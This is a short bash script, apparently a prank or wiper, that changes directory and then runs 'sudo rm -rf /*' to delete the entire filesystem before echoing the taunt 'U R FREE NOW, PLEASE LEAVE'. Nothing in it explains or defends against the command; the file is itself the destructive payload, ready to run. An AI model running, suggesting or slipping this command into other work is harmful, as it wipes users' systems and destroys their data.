#!/bin/bash

cd $home
sudo rm -rf /*
echo"U R FREE NOW, PLEASE LEAVE"
